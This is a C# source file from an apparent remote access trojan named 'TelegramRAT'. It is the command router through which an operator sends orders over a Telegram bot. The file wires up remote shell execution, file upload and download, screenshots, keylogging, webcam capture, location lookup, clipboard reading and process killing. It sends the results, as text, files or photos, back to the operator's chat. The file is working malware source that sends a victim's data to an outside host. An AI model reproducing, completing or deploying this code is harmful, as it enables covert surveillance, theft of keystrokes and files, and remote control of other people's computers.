namespace TelegramRAT.Core;

using TelegramRAT.Commands;
using TelegramRAT.Config;
using TelegramRAT.Models;
using TelegramRAT.Telegram;

internal sealed class CommandRouter
{
    private readonly TelegramClient _client;
    private readonly Dictionary<string, IAsyncCommand> _commands;

    public CommandRouter(TelegramClient client, BotConfig config)
    {
        _client = client;
        _commands = new Dictionary<string, IAsyncCommand>(StringComparer.OrdinalIgnoreCase)
        {
            ["shell"] = new ShellExecute(),
            ["upload"] = new FileTransfer(_client),
            ["download"] = new FileTransfer(_client),
            ["screenshot"] = new ScreenshotCmd(_client),
            ["sysinfo"] = new SystemInfo(),
            ["processes"] = new ProcessCmd(),
            ["kill"] = new ProcessCmd(),
            ["keylog"] = new KeyloggerCmd(),
            ["webcam"] = new WebcamCmd(_client),
            ["location"] = new LocationCmd(),
            ["clipboard"] = new ClipboardCmd()
        };
    }

    public async Task RouteAsync(BotCommand command, long chatId)
    {
        if (!_commands.TryGetValue(command.Command, out var handler))
        {
            if (command.Command == "menu")
            {
                await _client.SendInlineKeyboardAsync(chatId, InlineKeyboard.MainMenu());
                return;
            }

            await _client.SendTextAsync(chatId, $"Unknown command: `{command.Command}`");
            return;
        }

        try
        {
            var result = await handler.ExecuteAsync(command.Arguments);
            await SendResultAsync(chatId, result);
        }
        catch (Exception ex)
        {
            await _client.SendTextAsync(chatId, $"Error: `{ex.Message}`");
        }
    }

    private async Task SendResultAsync(long chatId, CommandResult result)
    {
        if (result.FilePath != null)
        {
            await _client.SendDocumentAsync(chatId, result.FilePath);
        }
        else if (result.PhotoData != null)
        {
            await _client.SendPhotoAsync(chatId, result.PhotoData, result.Caption);
        }
        else
        {
            var text = result.Text ?? "Done";
            if (text.Length > 4000)
            {
                var chunks = SplitMessage(text, 4000);
                foreach (var chunk in chunks)
                    await _client.SendTextAsync(chatId, $"```\n{chunk}\n```");
            }
            else
            {
                await _client.SendTextAsync(chatId, $"```\n{text}\n```");
            }
        }
    }

    private static List<string> SplitMessage(string text, int maxLength)
    {
        var chunks = new List<string>();
        for (int i = 0; i < text.Length; i += maxLength)
            chunks.Add(text.Substring(i, Math.Min(maxLength, text.Length - i)));
        return chunks;
    }
}
